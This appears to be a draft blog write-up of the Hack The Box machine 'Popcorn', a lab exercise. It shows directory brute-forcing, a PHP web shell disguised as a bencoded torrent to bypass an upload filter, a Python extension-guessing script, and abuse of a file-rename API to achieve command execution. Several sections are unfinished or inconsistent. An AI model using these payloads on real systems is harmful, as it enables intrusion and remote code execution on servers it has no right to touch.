---
layout: post
title:  "Hack The Box - Popcorn - Writeup"
date:   2000-01-01 07:00:00 +0200
tags: ["Hack The Box","OSWE"]
---
{% assign imgDir="HTB-Popcorn-Writeup" %}

# Introduction
The hack the box machine "Popcorn" is a medium machine which is included in [TJnull's OSWE Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=665299979). Exploiting this machine requires knowledge in the areas of 

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="BlockyCard">

By enumerating the target, it is possible to discover 

# Exploitation
We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.85`. The `-sS` `-sC` and `-sV` flags instructs nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that port 22 and 80 are open. These ports correspond to SSH and HTTP respectively. 

![nmap](/assets/{{ imgDir }}/nmap.png)

As SSH is normally a dead end, we start by investigating port 80. if we visit [http://10.10.10.6](http://10.10.10.6) in a browser, we are greeted with the index page below.

![index](/assets/{{ imgDir }}/index.png)

As this index page doesn't provide us with much interesting information, we proceed by performing directory bruteforcing. This can be performed using `ffuf` as shown below. The `-u` and `-w` flag specify a URL to brute force and a wordlist respectively. Note that the `FUZZ` keyword in the URL specifies what part of the URL we want to fuzz and that the `-ic` flag is used to ignore comments in the wordlist.

{% highlight none linenos %}
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://10.10.10.6/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic
[...]
                        [Status: 200, Size: 177, Words: 22, Lines: 5]
index                   [Status: 200, Size: 177, Words: 22, Lines: 5]
test                    [Status: 200, Size: 47065, Words: 2465, Lines: 651]
torrent                 [Status: 301, Size: 310, Words: 20, Lines: 10]
rename                  [Status: 301, Size: 309, Words: 20, Lines: 10]
                        [Status: 200, Size: 177, Words: 22, Lines: 5]
:: Progress: [220547/220547] :: Job [1/1] :: 1025 req/sec :: Duration: [0:03:35] :: Errors: 1 ::
{% endhighlight %}

By visiting the `/test` page, we discover that it is a phpinfo page. This page contains infromation about PHP and how PHP is configured. The next page `/torrent`, leads us to the a torrenting page shown in the first image below. The final page is `/rename` which results in an api for renaming files, shown in the second image below. Since we know that the web application uses php and that we can rename potentially arbitrary files on the system, we should be able to get remote code execution on the host if we can just find a way to upload arbitrary php code.

![torrent](/assets/{{ imgDir }}/torrent.png)

![rename](/assets/{{ imgDir }}/rename.png)

The torrent page appears to be used for sharing `.torrent` files. This type of files are used for peer-to-peer(file sharing) file sharing and are bencoded(link). If we try to click the upload button on the torrent page, we discover that we need to login before we can upload any torrents. We can however, click the browse button and see a file which was uploaded by the `Admin` user. We can, however, not edit this file. By 

![torrentBrowse](/assets/{{ imgDir }}/torrentBrowse.png)

![torrentBrowse2](/assets/{{ imgDir }}/torrentBrowse2.png)

Something interesting on the torrent page is the `Sign up` button. If we click this button, we reach a registration form. Submitting it with the values shown below (all `x` except for the code) leads to a new account named "x" being created and us automatically being logged in.

![signUp](/assets/{{ imgDir }}/signUp.png)

![signUp2](/assets/{{ imgDir }}/signUp2.png)

![Upload](/assets/{{ imgDir }}/upload.png)

I tried uploading a php reverse shell payload but couldn't evade the filter without changing the content of the uploaded file. There is a [bonus section] at the end of this page which details how to evade the filter and gain remote code execution on the target in a slightly more complicated approach. However, we'll stick to the easier way. It was we can upload a real torrent file . I used a [random torrent](https://kali.download/base-images/kali-2021.3/kali-linux-2021.3a-installer-amd64.iso.torrent) from the [Kali Linux web site](https://www.kali.org/get-kali/).

Once uploaded, we can navigate to the torrents page and click "Edit picture". Here, it appears to be possible to upload pictures with any content. We create a file named "webShell.png" with the content below, and upload it.

The next step is to perform a privilege escalation from `www-data` to `root`. There are two ways to do this. The first way is to abuse a known vulnerability in Linux PAM and the second is through kernel exploitation. The next
# Privilege Escalation - PAM

We set up ssh for www-data

https://www.exploit-db.com/exploits/14273

# Privilege Escalation - Kernel Exploitation

# Bonus - Initial Shell (Hard way)
The starting point for this section is that we have found the torrent page http://10.10.10.6/torrent and that we have created an account with the username `x` and the password `x` as [described earlier](). The upload page is shown below. This upload page expects a torrent file and won't let a user upload anything without first inspecting the content of the file being uploaded. Torrent files are noramlly bencoded. 

(Explain bencoding)

We could try to upload a php web shell. We start by storing the content below in a file named "evil.torrent". This file contains a random integer `2` which is bencoded and a php web shell payload.

{% highlight python linenos %}
i2e
<?php
$cmd = ($_REQUEST['cmd']);
system($cmd);
?>
{% endhighlight %}

Next, we press the `Browse` button, select the file, press "OK" and type the name "evil". This creates the form shown below.

![uploadEvilTorrent](/assets/{{ imgDir }}/uploadEvilTorrent.png)

![uploadedEvilTorrent](/assets/{{ imgDir }}/uploadedEvilTorrent.png)

After pressing `Upload Torrent`, we are redirected to the URL `http://10.10.10.6/torrent/torrents.php?mode=details&id=b44b82a4bc6c35f6ad5e9fceefef9509c17fba74` which shows us the uploaded torrent as shown above. This means that the web application thought that this was a legitimate torrent file and that we successfully bypassed the filter! From the URL, we also obtain the ID value `b44b82a4bc6c35f6ad5e9fceefef9509c17fba74` which supposedly corresponds to our torrent. The next step is to find the uploaded file.

{% highlight none linenos %}
kali@kali:/tmp/x$ ffuf -u http://10.10.10.6/torrent/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic
[...]
rss                     [Status: 200, Size: 2419, Words: 124, Lines: 61]
download                [Status: 200, Size: 0, Words: 1, Lines: 1]
images                  [Status: 301, Size: 317, Words: 20, Lines: 10]
index                   [Status: 200, Size: 11356, Words: 1103, Lines: 294]
                        [Status: 200, Size: 11356, Words: 1103, Lines: 294]
login                   [Status: 200, Size: 8371, Words: 769, Lines: 228]
templates               [Status: 301, Size: 320, Words: 20, Lines: 10]
users                   [Status: 301, Size: 316, Words: 20, Lines: 10]
admin                   [Status: 301, Size: 316, Words: 20, Lines: 10]
health                  [Status: 301, Size: 317, Words: 20, Lines: 10]
browse                  [Status: 200, Size: 9278, Words: 794, Lines: 186]
comment                 [Status: 200, Size: 936, Words: 83, Lines: 17]
upload                  [Status: 301, Size: 317, Words: 20, Lines: 10]
css                     [Status: 301, Size: 314, Words: 20, Lines: 10]
edit                    [Status: 200, Size: 0, Words: 1, Lines: 1]
lib                     [Status: 301, Size: 314, Words: 20, Lines: 10]
database                [Status: 301, Size: 319, Words: 20, Lines: 10]
secure                  [Status: 200, Size: 4, Words: 1, Lines: 3]
js                      [Status: 301, Size: 313, Words: 20, Lines: 10]
logout                  [Status: 200, Size: 182, Words: 11, Lines: 1]
config                  [Status: 200, Size: 0, Words: 1, Lines: 1]
preview                 [Status: 200, Size: 27029, Words: 128, Lines: 138]
readme                  [Status: 301, Size: 317, Words: 20, Lines: 10]
thumbnail               [Status: 200, Size: 1748, Words: 21, Lines: 11]
torrents                [Status: 301, Size: 319, Words: 20, Lines: 10]
validator               [Status: 200, Size: 0, Words: 1, Lines: 1]
hide                    [Status: 200, Size: 3765, Words: 194, Lines: 135]
PNG                     [Status: 301, Size: 314, Words: 20, Lines: 10]
                        [Status: 200, Size: 11356, Words: 1103, Lines: 294]
:: Progress: [220547/220547] :: Job [1/1] :: 993 req/sec :: Duration: [0:03:42] :: Errors: 0 ::
{% endhighlight %}
We start by searching for upload directories through ffuf. As can be seen above, there are a lot of results. However, we can suspect that the file file is either in the `torrents` or `uploads` directory since these names seems like places where you would put a torrent file.

We could try to visit x and x, however these URLs just lead to "404 Not Found" pages. At this points, we can suspect that the file name is wrong, that the extension is wrong or that we are looking in the wrong directory. If we assume that the directory and file name is correct, we can write a script which tries to guess the correct extension. This script can be written in python as shown below.

{% highlight python linenos %}
import requests, sys, time

filename = "b44b82a4bc6c35f6ad5e9fceefef9509c17fba74" #CHANGE THIS
directory = "torrents"                                      #CHANGE THIS

#Obtain a session cookie for a logged in user
data = {"username":"x","password":"x"}
r = requests.post("http://10.10.10.6/torrent/login.php", data=data, allow_redirects=False)
sessionCookie = r.headers["Set-Cookie"].split(";")[0]
headers = {"Cookie":""+sessionCookie}

#Generate extensions
validChars= "abcdefghijklmnopqrstuvwxyz"
extensions = [i+j+k for i in validChars for j in validChars for k in validChars]

#Brute force extensions
startTime = time.time()
for extension in extensions:
    elTime = str(int(time.time() - startTime))
    print("Extension: '%s'. Elapsed time: %s seconds." % (extension,elTime), end="\r")

    URL = "http://10.10.10.6/torrent/"+directory+"/"+filename+"."+extension
    r = requests.get(URL)
    if r.status_code != 404:
        print("Found URL: " + URL)
        print("The URL was found in %s seconds" % int(time.time() - startTime))
        sys.exit(0)
{% endhighlight %}

Note that we log in since we don't know if we need to be authenticated to access the file.

This code.. TODO: Explain

If we run the code, we get the following output.

The author might have chosen to save torrent files with the extension `.btf` since "BTF" is an abbreviation for "bit torrent file". It is, however, not a commen file extension.

Note: On my machine, this script would take approximately 12 minutes to find a random extension. Since the extension started with one of the first characters in the alphabet, it only took 81 seconds. 

![foundEvilTorrent](/assets/{{ imgDir }}/foundEvilTorrent.png)

By visiting http://10.10.10.6/torrent/torrents/eb2af9670237f53152c68317b252bf49403ce545.btf we can see the content of the evil torrent file we submitted. However, the php code is not being executed. As such, we need to somehow modify the file extension of the script.

Earlier, we discovered an api for renaming files. We can use this api to change the file extension of this file. This can be done by visiting the URL
`http://10.10.10.6/rename/index.php?filename=/var/www/torrent/torrents/b44b82a4bc6c35f6ad5e9fceefef9509c17fba74.btf&newfilename=/var/www/torrent/torrents/b44b82a4bc6c35f6ad5e9fceefef9509c17fba74.php`

![bonusId](/assets/{{ imgDir }}/bonusId.png)

Upon visiting the URL, we get the message "OK!", suggesting that the renaming operation was successful. Then, we can execute code by visiting 
`http://10.10.10.6/torrent/torrents/b44b82a4bc6c35f6ad5e9fceefef9509c17fba74.php?cmd=[command]` where `[command]`. At this point, we can get a shell on the host with the netcat reverse shell payload shown earlier. Note the i2e does not go away.
